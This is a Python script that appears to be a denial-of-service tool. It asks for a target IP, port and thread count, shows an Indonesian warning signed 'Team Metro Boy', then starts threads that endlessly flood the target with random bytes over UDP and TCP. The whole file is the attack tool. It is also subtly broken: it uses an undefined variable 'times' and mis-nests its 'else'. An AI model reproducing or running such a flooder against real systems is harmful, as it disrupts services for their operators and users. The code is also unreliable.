import random
import socket
import threading
import os
import sys
import struct
import time
import codecs

os.system("clear")
choice =str(input("$y/n : "))
ip =str(input("$ip : "))
port =int(input("$port : "))
packet =int(input("$times : "))
threads =int(input("$threads : "))

def  type(s):

        for c in s  +  '\n' :

              sys.stdout.write( c )

              sys.stdout.flush( )

              time.sleep(0.05)

type("""WARNING !!
Tolong Jangan Gunakan Alat Ini Hanya Untuk Kesenangan Diri Anda Sendiri Gunakanlah Sebaik Mungkin Dan Sebijak Mungkin Kami Dari Team Metro Boy Mengingatkan Anda Untuk Berbuat Baik kepada sesama Manusia""")
time.sleep(2.0)
os.system("clear")

def run():
	data = random._urandom(68)
	i = random.choice(("[+]","[×]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" You Has Sent")
		except:
			print("[!] ERROR")
				    
def run2():
	data = random._urandom(118)
	i = random.choice(("[+]","[×]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" You Has Sent")
		except:
			s.close()
			print("[!] ERROR")

def run3():
	data = random._urandom(132)
	i = random.choice(("[+]","[×]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" You Has Sent")
		except:
			s.close()
			print("[!] ERROR")

def run4():
	data = random._urandom(142)
	i = random.choice(("[+]","[×]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" You Has Sent")
		except:
			s.close()
			print("[!] ERROR")

def run5():
	data = random._urandom(158)
	i = random.choice(("[+]","[×]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" You Has Sent")
		except:
			s.close()
			print("[!] ERROR")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()

else:
    th = threading.Thread(target = run)
    th.start()

